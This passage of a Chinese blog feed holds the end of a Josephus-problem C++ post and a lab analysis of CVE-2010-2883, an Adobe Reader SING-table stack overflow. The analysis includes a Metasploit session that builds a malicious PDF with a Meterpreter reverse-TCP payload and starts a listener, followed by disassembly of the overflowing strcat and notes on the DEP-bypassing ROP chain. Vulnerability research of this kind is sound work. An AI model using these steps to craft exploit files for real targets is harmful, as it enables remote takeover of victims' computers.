class="keyword">if</span> (p == n) p = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"最后剩下的是"</span> &lt;&lt; a[p] &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;约瑟夫问题是个有名的问题：N个人围成一圈，从第一个开始报数，第M个将被杀掉，最后剩下一个，其余人都将被杀掉。例如N=6，M=5，被杀掉的顺序是：5，4，6，2，3，1。&lt;/p&gt;
&lt;p&gt;代码实现：&lt;/p&gt;
&lt;figure class=&quot;highlight c++&quot;&gt;&lt;tabl
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="Algorithm" scheme="http://yoursite.com/tags/Algorithm/"/>
    
      <category term="约瑟夫问题" scheme="http://yoursite.com/tags/%E7%BA%A6%E7%91%9F%E5%A4%AB%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</title>
    <link href="http://yoursite.com/2020/03/15/CVE-2010-2883/"/>
    <id>http://yoursite.com/2020/03/15/CVE-2010-2883/</id>
    <published>2020-03-14T17:39:48.865Z</published>
    <updated>2020-03-20T17:28:55.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一、调试环境"><a href="#一、调试环境" class="headerlink" title="一、调试环境"></a>一、调试环境</h1><p>windows xp sp3中文版</p><p>Adobe Reader (9.3.4)</p><p>Ollydbg</p><p>IDA Pro</p><p>010editor</p><h1 id="二、漏洞分析"><a href="#二、漏洞分析" class="headerlink" title="二、漏洞分析"></a>二、漏洞分析</h1><h2 id="1-样本构造"><a href="#1-样本构造" class="headerlink" title="1.样本构造"></a>1.样本构造</h2><p>使用msf生成样本并设置监听程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; search cve-2010-2883</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">   #  Name                                            Disclosure Date  Rank   Check  Description</span><br><span class="line">   -  ----                                            ---------------  ----   -----  -----------</span><br><span class="line">   0  exploit&#x2F;windows&#x2F;browser&#x2F;adobe_cooltype_sing     2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">   1  exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing  2010-09-07       great  No     Adobe CoolType SING Table &quot;uniqueName&quot; Stack Buffer Overflow</span><br><span class="line">msf5 &gt; use exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; options                             Module options (exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing):           </span><br><span class="line">   Name      Current Setting  Required  Description                         </span><br><span class="line">   ----      ---------------  --------  -----------                    </span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.                                   </span><br><span class="line">   Exploit target:                                                               </span><br><span class="line">   Id  Name                                       </span><br><span class="line">   --  ----                                      </span><br><span class="line">   0   Automatic                                                   </span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp                                                  </span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp </span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; options</span><br><span class="line">Module options (exploit&#x2F;windows&#x2F;fileformat&#x2F;adobe_cooltype_sing):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   FILENAME  msf.pdf          yes       The file name.</span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line"></span><br><span class="line">   **DisablePayloadHandler: True   (no handler will be created!)**</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Automatic</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST &#x3D;&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; set filename msf4444.pdf</span><br><span class="line">filename &#x3D;&gt; msf4444.pdf</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; exploit </span><br><span class="line">[*] Creating &#39;msf4444.pdf&#39; file...</span><br><span class="line">[+] msf4444.pdf stored at &#x2F;home&#x2F;kali&#x2F;.msf4&#x2F;local&#x2F;msf4444.pdf</span><br><span class="line">msf5 exploit(windows&#x2F;fileformat&#x2F;adobe_cooltype_sing) &gt; back</span><br><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">payload &#x3D;&gt; windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; options </span><br><span class="line">Module options (exploit&#x2F;multi&#x2F;handler):</span><br><span class="line">   Name  Current Setting  Required  Description</span><br><span class="line">   ----  ---------------  --------  -----------</span><br><span class="line">Payload options (windows&#x2F;meterpreter&#x2F;reverse_tcp):</span><br><span class="line">   Name      Current Setting  Required  Description</span><br><span class="line">   ----      ---------------  --------  -----------</span><br><span class="line">   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)</span><br><span class="line">   LHOST                      yes       The listen address (an interface may be specified)</span><br><span class="line">   LPORT     4444             yes       The listen port</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Wildcard Target</span><br><span class="line">   </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set LHOST 192.168.110.142</span><br><span class="line">LHOST &#x3D;&gt; 192.168.110.142</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; exploit</span><br></pre></td></tr></table></figure><p>反弹shell成功：</p><p><img src="%E5%8F%8D%E5%BC%B9shell.png" alt=""></p><p><img src="%E5%8F%8D%E5%BC%B9shell2.png" alt=""></p><p>表明样本构造成功：</p><h2 id="2-样本行为分析"><a href="#2-样本行为分析" class="headerlink" title="2.样本行为分析"></a>2.样本行为分析</h2><p>使用Process Monitor开启程序的监控，分析样本行为。这里我们主要检测其网络行为。我们发现其与192.168.110.142的地址通过4444端口进行tcp通信：</p><p><img src="%E8%A1%8C%E4%B8%BA%E5%88%86%E6%9E%90.png" alt=""></p><h2 id="3-静态分析"><a href="#3-静态分析" class="headerlink" title="3.静态分析"></a>3.静态分析</h2><p>基于前人的探索，我们可以直接定位到漏洞位置；IDA Pro反汇编CoolType.dll库，搜索“SING”字符串，定位到下图位置：</p><p><img src="SING.png" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">.text:0803DCF9                 push    ebp</span><br><span class="line">.text:0803DCFA                 sub     esp, 104h       ; 分配栈空间0x104</span><br><span class="line">.text:0803DD00                 lea     ebp, [esp-4]    ; strcat的dest</span><br><span class="line">.text:0803DD04                 mov     eax, ___security_cookie</span><br><span class="line">.text:0803DD09                 xor     eax, ebp</span><br><span class="line">.text:0803DD0B                 mov     [ebp+108h+var_4], eax</span><br><span class="line">.text:0803DD11                 push    4Ch</span><br><span class="line">.text:0803DD13                 mov     eax, offset sub_8184A54</span><br><span class="line">.text:0803DD18                 call    __EH_prolog3_catch</span><br><span class="line">.text:0803DD1D                 mov     eax, [ebp+108h+arg_C]</span><br><span class="line">.text:0803DD23                 mov     edi, [ebp+108h+arg_0]</span><br><span class="line">.text:0803DD29                 mov     ebx, [ebp+108h+arg_4]</span><br><span class="line">.text:0803DD2F                 mov     [ebp+108h+var_130], edi</span><br><span class="line">.text:0803DD32                 mov     [ebp+108h+var_138], eax</span><br><span class="line">.text:0803DD35                 call    sub_804172C</span><br><span class="line">.text:0803DD3A                 xor     esi, esi</span><br><span class="line">.text:0803DD3C                 cmp     dword ptr [edi+8], 3</span><br><span class="line">.text:0803DD40                 mov     [ebp+108h+var_10C], esi</span><br><span class="line">.text:0803DD43                 jz      loc_803DF00</span><br><span class="line">.text:0803DD49                 mov     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD4C                 mov     [ebp+108h+var_120], esi</span><br><span class="line">.text:0803DD4F                 cmp     dword ptr [edi+0Ch], 1</span><br><span class="line">.text:0803DD53                 mov     byte ptr [ebp+108h+var_10C], 1</span><br><span class="line">.text:0803DD57                 jnz     loc_803DEA9</span><br><span class="line">.text:0803DD5D                 push    offset aName    ; &quot;name&quot;</span><br><span class="line">.text:0803DD62                 push    edi             ; int</span><br><span class="line">.text:0803DD63                 lea     ecx, [ebp+108h+var_124]</span><br><span class="line">.text:0803DD66                 mov     [ebp+108h+var_119], 0</span><br><span class="line">.text:0803DD6A                 call    sub_80217D7</span><br><span class="line">.text:0803DD6F                 cmp     [ebp+108h+var_124], esi</span><br><span class="line">.text:0803DD72                 jnz     short loc_803DDDD</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C] ; SING表的入口地址</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C] ; SING表的入口处的值</span><br><span class="line">.text:0803DD85                 cmp     eax, esi        ; 判断是否为NULL</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4 ; 为空则跳转</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax] ;字体版本资源号，这里是1.0版本，即00 10 00 00</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F ; 发生跳转</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9Cj</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; char *src</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+var_108]</span><br><span class="line">.text:0803DDA6                 push    eax             ; char *dest</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+var_108], 0</span><br><span class="line">.text:0803DDAB                 call    strcat          ; 造成溢出</span><br></pre></td></tr></table></figure><h2 id="4-动态分析"><a href="#4-动态分析" class="headerlink" title="4.动态分析"></a>4.动态分析</h2><p>使用Olldbg attach到Adobe Reader进程，寻找CoolType.dll中的位置在下图所示位置：</p><p><img src="OD1.png" alt=""></p><p>注意这里，之前断点一直没有触发，在网上找了好久，才找到如下解决方法：</p><p><img src="OD2.png" alt=""></p><p>打开样本触发断点：</p><p><img src="OD4.png" alt=""></p><p>继续执行，到造成溢出处断下，数据拷贝方向如下：</p><p><img src="OD5.png" alt=""></p><p>f8执行，栈空间已被覆盖：</p><p><img src="OD6.png" alt=""></p><p>参考漏洞战争，在这下个断点：</p><p><img src="OD7.png" alt=""></p><p>f7单步步入，在此处返回，ROP指令1：</p><p><img src="OD8.png" alt=""></p><p>ROP指令2：</p><p><img src="ROP1.png" alt=""></p><p>ROP指令3：</p><p><img src="ROP2.png" alt=""></p><p>ROP指令4：</p><p><img src="ROP4.png" alt=""></p><p>通过分析栈空间内容，可以分析处样本通过ROP技术调用了CreateFileA();</p><p>CreateFileMapping();</p><p>MapViewOfFile();</p><p>memcpy()</p><p>等一系列函数来绕过DEP保护。</p><p><img src="Createfile.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;一、调试环境&quot;&gt;&lt;a href=&quot;#一、调试环境&quot; class=&quot;headerlink&quot; title=&quot;一、调试环境&quot;&gt;&lt;/a&gt;一、调试环境&lt;/h1&gt;&lt;p&gt;windows xp sp3中文版&lt;/p&gt;
&lt;p&gt;Adobe Reader (9.3.4)&lt;/p&gt;
&lt;p&gt;O
      
    
    </summary>
    
    
      <category term="技术分析" scheme="http://yoursite.com/categories/%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/"/>
    
    
      <category term="CVE" scheme="http://yoursite.com/tags/CVE/"/>
    
      <category term="Windows" scheme="http://yoursite.com/tags/Windows/"/>
    
  </entry>
  
</feed>
